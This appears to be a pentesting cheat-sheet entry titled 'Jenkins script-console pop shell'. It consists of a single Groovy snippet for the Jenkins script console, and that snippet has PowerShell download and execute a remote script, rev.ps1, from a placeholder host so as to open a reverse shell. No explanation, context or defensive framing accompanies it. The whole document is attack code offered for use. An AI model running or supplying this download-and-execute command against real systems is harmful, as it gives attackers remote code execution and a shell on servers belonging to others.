# Jenkins script-console pop shell

```sh
cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://xxx.xxx.xxx:8000/rev.ps1')" """
println cmd.execute().text
```
